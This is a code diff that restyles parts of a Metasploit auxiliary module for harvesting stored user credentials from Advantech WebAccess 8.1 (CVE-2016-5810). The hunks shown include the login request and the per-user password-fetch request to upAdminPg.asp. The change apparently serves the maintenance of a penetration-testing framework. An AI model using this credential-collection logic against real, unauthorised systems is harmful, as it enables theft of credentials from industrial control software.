@@ -6,35 +6,42 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Advantech WebAccess 8.1 Post Authentication Credential Collector",
-      'Description'    => %q{
-        This module allows you to log into Advantech WebAccess 8.1, and collect all of the credentials.
-        Although authentication is required, any level of user permission can exploit this vulnerability.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Advantech WebAccess 8.1 Post Authentication Credential Collector",
+        'Description' => %q{
+          This module allows you to log into Advantech WebAccess 8.1, and collect all of the credentials.
+          Although authentication is required, any level of user permission can exploit this vulnerability.
 
-        Note that 8.2 is not suitable for this.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          Note that 8.2 is not suitable for this.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'h00die', # Pointed out the obvious during a PR review for CVE-2017-5154
           'sinn3r', # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2016-5810'],
           ['URL', 'https://github.com/rapid7/metasploit-framework/pull/7859#issuecomment-274305229']
         ],
-      'DisclosureDate' => '2017-01-21'
-    ))
+        'DisclosureDate' => '2017-01-21',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('WEBACCESSUSER', [true, 'Username for Advantech WebAccess', 'admin']),
         OptString.new('WEBACCESSPASS', [false, 'Password for Advantech WebAccess', '']),
         OptString.new('TARGETURI', [true, 'The base path to Advantech WebAccess', '/']),
-      ])
+      ]
+    )
   end
 
   def do_login
@@ -43,15 +50,15 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.path, 'broadweb', 'user', 'signin.asp')
 
     res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => uri,
+      'method' => 'POST',
+      'uri' => uri,
       'vars_post' => {
         'page' => '/',
-        'pos'  => '',
+        'pos' => '',
         'username' => datastore['WEBACCESSUSER'],
         'password' => datastore['WEBACCESSPASS'],
-        'remMe'    => '',
-        'submit1'  => 'Login'
+        'remMe' => '',
+        'submit1' => 'Login'
       }
     })
 
@@ -77,11 +84,11 @@ class MetasploitModule < Msf::Auxiliary
   def get_user_cred_detail(sid, user)
     vprint_status("Gathering password for user: #{user}")
 
-    uri = normalize_uri(target_uri.path, 'broadWeb','user', 'upAdminPg.asp')
+    uri = normalize_uri(target_uri.path, 'broadWeb', 'user', 'upAdminPg.asp')
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri,
+      'uri' => uri,
       'cookie' => sid,
       'vars_get' => {
         'uname' => user
@@ -106,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri,
+      'uri' => uri,
       'cookie' => sid
     })
 
